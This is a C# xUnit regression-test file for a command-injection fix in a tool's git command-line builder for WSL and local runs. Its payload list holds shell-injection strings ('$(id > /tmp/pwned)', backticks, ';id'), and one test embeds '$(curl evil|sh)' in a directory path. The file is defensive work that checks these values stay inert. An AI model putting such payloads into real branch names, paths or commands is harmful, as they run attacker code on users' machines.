using System.Linq;
using CodeShellManager.Services;
using Xunit;

namespace CodeShellManager.Tests;

/// <summary>
/// Regression tests for the command-injection fix found in the v0.8.0 pre-release review.
///
/// Two defects, one root cause — git command lines were built by string interpolation:
///
///   $"-d {distro} -- git -C {cwd} {arguments}"          (WSL)
///   $"-C \"{workingDir}\" {arguments}"                   (local)
///
/// `wsl.exe … -- <tail>` runs the tail through the distro's DEFAULT LOGIN SHELL — the
/// codebase verifies this itself in ShellSession.BuildWslArgs, which is why that method uses
/// `-e`. So a `$(…)`, backtick, `;` or `|` in a branch name or working-folder path executed
/// inside the distro. Git ref names legally permit all of those, and branch names come from
/// the cloned repo, so opening a hostile repository and creating a worktree from its branch
/// was arbitrary code execution.
///
/// These tests assert the two properties that make that impossible: `-e` rather than `--`,
/// and every value surviving as exactly one argv element through the real Win32 tokenizer.
/// </summary>
public class GitServiceInjectionTests
{
    // Payloads that would execute, or split an argument, if they ever reached a shell or
    // were concatenated unquoted. All are legal git ref names or legal Linux directory names.
    public static TheoryData<string> HostilePayloads() => new()
    {
        "$(id > /tmp/pwned)",
        "`id`",
        "a;id",
        "a|id",
        "a&&id",
        "a b",                    // plain split
        "a\"b",                   // quote — this is what broke the local path
        @"a\b",
        @"trailing\\",            // backslash run before the closing quote
        "$IFS",
        "a\nb",
    };

    /// <summary>
    /// The argv from `git` onwards — i.e. what the distro's git actually receives, ignoring
    /// the wsl.exe preamble. Position-independent so a change to the preamble (there has
    /// already been one) doesn't require rewriting every expectation.
    /// </summary>
    private static string[] GitArgv(string commandLine)
    {
        string[] argv = Win32CommandLineTests.Split(commandLine);
        int g = argv.ToList().IndexOf("git");
        Assert.True(g >= 0, "no `git` in: " + commandLine);
        return argv[g..];
    }

    [Theory]
    [MemberData(nameof(HostilePayloads))]
    public void WslGitCommandLine_KeepsEachValueAsExactlyOneArgument(string payload)
    {
        string cmd = GitService.BuildWslGitCommandLine(
            "Ubuntu", "/home/alice/repo",
            new[] { "worktree", "add", "-b", payload, "--", "/home/alice/wt" });

        Assert.Equal(
            new[] { "git", "-C", "/home/alice/repo",
                    "worktree", "add", "-b", payload, "--", "/home/alice/wt" },
            GitArgv(cmd));
    }

    [Theory]
    [MemberData(nameof(HostilePayloads))]
    public void LocalGitCommandLine_KeepsEachValueAsExactlyOneArgument(string payload)
    {
        string cmd = GitService.BuildLocalGitCommandLine(
            @"C:\repo", new[] { "worktree", "add", "-b", payload, @"C:\wt" });

        string[] argv = Win32CommandLineTests.Split(cmd);

        Assert.Equal(
            new[] { "-C", @"C:\repo", "worktree", "add", "-b", payload, @"C:\wt" },
            argv);
    }

    [Fact]
    public void WslGitCommandLine_UsesDashE_NotDashDash()
    {
        // The whole fix. `--` hands the tail to the distro's login shell; `-e` execs the
        // named program directly. If this regresses, every payload above becomes live again.
        string cmd = GitService.BuildWslGitCommandLine(
            "Ubuntu", "/repo", new[] { "status", "--porcelain" });

        string[] argv = Win32CommandLineTests.Split(cmd);

        Assert.Equal("-e", argv[2]);
        // No bare `--` may appear in the wsl.exe option section (before the program).
        Assert.DoesNotContain("--", argv[..argv.ToList().IndexOf("git")]);
    }

    [Fact]
    public void WslGitCommandLine_RunsGitThroughALoginShellWithoutReparsingArguments()
    {
        // A bare `-e git` is injection-safe but drops the login shell, so PATH is the bare
        // default and anyone whose git comes from nix/asdf/linuxbrew silently loses WSL git
        // (symptom: "not a git repo"). The old `--` form did run a login shell.
        //
        // `-e sh -lc 'exec "$0" "$@"' git …` gets the login PATH back safely: the script is
        // a FIXED LITERAL and every untrusted value arrives as a positional parameter, which
        // "$0"/"$@" expand verbatim without re-parsing.
        string cmd = GitService.BuildWslGitCommandLine(
            "Ubuntu", "/repo", new[] { "status" });

        string[] argv = Win32CommandLineTests.Split(cmd);
        int e = argv.ToList().IndexOf("-e");

        Assert.Equal("sh", argv[e + 1]);
        Assert.Equal("-lc", argv[e + 2]);
        // The script must contain no interpolated data — only positional expansion.
        Assert.Equal(GitService.WslGitScript, argv[e + 3]);
        Assert.Equal("git", argv[e + 4]);
    }

    [Theory]
    [MemberData(nameof(HostilePayloads))]
    public void TheShellScriptIsAlwaysTheSameLiteral(string payload)
    {
        // The safety of the -lc form rests entirely on the script never varying with input.
        string cmd = GitService.BuildWslGitCommandLine(
            "Ubuntu", payload, new[] { "worktree", "add", "-b", payload, "--", payload });

        string[] argv = Win32CommandLineTests.Split(cmd);

        Assert.Single(argv, a => a == GitService.WslGitScript);
        Assert.Equal(GitService.WslGitScript, argv[argv.ToList().IndexOf("-lc") + 1]);
    }

    [Fact]
    public void ProfileNoiseBeforeTheSentinelIsStripped()
    {
        // `sh -l` sources /etc/profile and ~/.profile before running anything. A profile
        // that echoes would otherwise become the "branch name" — and would make
        // `status --porcelain` non-empty, pinning every WSL repo to dirty forever.
        string withBanner =
            "Welcome to Ubuntu\nsome motd" + GitService.WslOutputSentinel + "main\n";

        Assert.Equal("main\n", GitService.StripWslProfileNoise(withBanner));
    }

    [Fact]
    public void EverythingAfterTheMarkerIsKept()
    {
        Assert.Equal("main\n",
            GitService.StripWslProfileNoise(GitService.WslOutputSentinel + "main\n"));
    }

    [Fact]
    public void OutputWithNoSentinelIsReturnedIntact()
    {
        // No marker means the exec never happened — wsl.exe itself failed, the distro is
        // missing. That text is an error message the caller logs, not git output to trim.
        const string wslError = "There is no distribution with the supplied name.";

        Assert.Equal(wslError, GitService.StripWslProfileNoise(wslError));
        Assert.Equal("", GitService.StripWslProfileNoise(""));
    }

    [Fact]
    public void OnlyTheFirstMarkerSplits()
    {
        // The marker is distinctive enough that a collision from either side is
        // implausible, so the first occurrence is unambiguously the one our script printed.
        string s = "noise" + GitService.WslOutputSentinel + "real";

        Assert.Equal("real", GitService.StripWslProfileNoise(s));
    }

    [Fact]
    public void StatusPorcelainStaysEmptyWhenAProfileIsChatty()
    {
        // The concrete user-visible bug this prevents: empty porcelain output means "clean".
        // A banner would make it non-empty and every WSL repo would show as dirty forever.
        string stdout = "MOTD line one\nMOTD line two\n" + GitService.WslOutputSentinel;

        Assert.True(string.IsNullOrWhiteSpace(GitService.StripWslProfileNoise(stdout)));
    }

    [Fact]
    public void TheScriptHandedToTheLoginShellIsStillFreeOfInterpolatedData()
    {
        // The sentinel was added to the script; it must remain a constant.
        string a = GitService.BuildWslGitCommandLine("Ubuntu", "/a", new[] { "status" });
        string b = GitService.BuildWslGitCommandLine("Debian", "/b$(id)", new[] { "log", "`id`" });

        string ScriptOf(string cmd)
        {
            string[] argv = Win32CommandLineTests.Split(cmd);
            return argv[argv.ToList().IndexOf("-lc") + 1];
        }

        Assert.Equal(ScriptOf(a), ScriptOf(b));
        Assert.DoesNotContain("id", ScriptOf(b));
    }

    [Fact]
    public void WorktreeAdd_TerminatesOptionParsingBeforePositionals()
    {
        // git uses permuting parse_options, so a ref legitimately named `--force` sitting in
        // refs/heads would otherwise be consumed as an option rather than a commit-ish.
        string cmd = GitService.BuildLocalGitCommandLine(
            @"C:\repo", new[] { "worktree", "add", "--", @"C:\wt", "--force" });

        string[] argv = Win32CommandLineTests.Split(cmd);

        int dashDash = argv.ToList().IndexOf("--");
        int hostileRef = argv.ToList().IndexOf("--force");
        Assert.True(dashDash >= 0 && dashDash < hostileRef,
            "the option terminator must precede any repo-controlled positional");
    }

    [Fact]
    public void WslGitCommandLine_HostileWorkingFolderStaysOneArgument()
    {
        // The unattended half: cwd comes from the session's working folder and is reached by
        // the git poll on a timer, with no user action at all. `proj$(…)` is a legal Linux
        // directory name and creatable over \\wsl$.
        string cmd = GitService.BuildWslGitCommandLine(
            "Ubuntu", "/home/alice/proj$(curl evil|sh)", new[] { "status", "--porcelain" });

        Assert.Equal(
            new[] { "git", "-C", "/home/alice/proj$(curl evil|sh)", "status", "--porcelain" },
            GitArgv(cmd));
    }

    [Fact]
    public void WslGitCommandLine_HostileDistroNameStaysOneArgument()
    {
        string cmd = GitService.BuildWslGitCommandLine(
            "Ubuntu 22.04$(id)", "/repo", new[] { "status" });

        Assert.Equal("Ubuntu 22.04$(id)", Win32CommandLineTests.Split(cmd)[1]);
    }

    [Fact]
    public void ForEachRefFormat_SurvivesAsOneArgument()
    {
        // Not just a security property: `--format=%(refname:short)` is a bash syntax error
        // once a login shell sees it, so ListBranchesAsync could never have worked under
        // WSL while the `--` form was in use.
        string cmd = GitService.BuildWslGitCommandLine(
            "Ubuntu", "/repo", new[] { "for-each-ref", "--format=%(refname:short)", "refs/heads" });

        Assert.Equal(
            new[] { "git", "-C", "/repo", "for-each-ref", "--format=%(refname:short)", "refs/heads" },
            GitArgv(cmd));
    }

    [Fact]
    public void WslGitCommandLine_TranslatesUncArgumentsPerArgument()
    {
        string cmd = GitService.BuildWslGitCommandLine(
            "Ubuntu", "/repo",
            new[] { "worktree", "add", @"\\wsl$\Ubuntu\home\alice\my repo" });

        string[] argv = Win32CommandLineTests.Split(cmd);
        Assert.Equal("/home/alice/my repo", argv[^1]);
    }

    [Fact]
    public void TheSentinelAndTheScriptAgreeOnTheMarkerBytes()
    {
        // Two reviewers independently reported this as broken, because the constant used to
        // hold RAW 0x1E bytes that their file reads normalised away. It was correct — but a
        // value invisible to tooling is one "cleanup" away from silently breaking every WSL
        // repo: a stray 0x1E makes `status --porcelain` non-empty, so every repo reads dirty
        // forever. The constant is now written with  escapes, and this pins it against
        // what the shell script actually prints so drift fails here rather than in the field.
        string sentinel = GitService.WslOutputSentinel;

        Assert.Equal(0x1E, sentinel[0]);
        Assert.Equal(0x1E, sentinel[^1]);
        Assert.Equal("CSM-GIT", sentinel[1..^1]);

        // printf's octal 036 is 0x1E. One on each side of the same text.
        Assert.Contains("036CSM-GIT", GitService.WslGitScript);
        Assert.Equal(2, GitService.WslGitScript.Split("036").Length - 1);
    }

    [Fact]
    public void TheSentinelIsNotWhitespace()
    {
        // The failure mode if a byte ever leaks through the strip: IsNullOrWhiteSpace is
        // false for 0x1E, so a clean repo would be reported as dirty.
        Assert.False(string.IsNullOrWhiteSpace(GitService.WslOutputSentinel));
        Assert.Equal("", GitService.StripWslProfileNoise(GitService.WslOutputSentinel));
    }
}
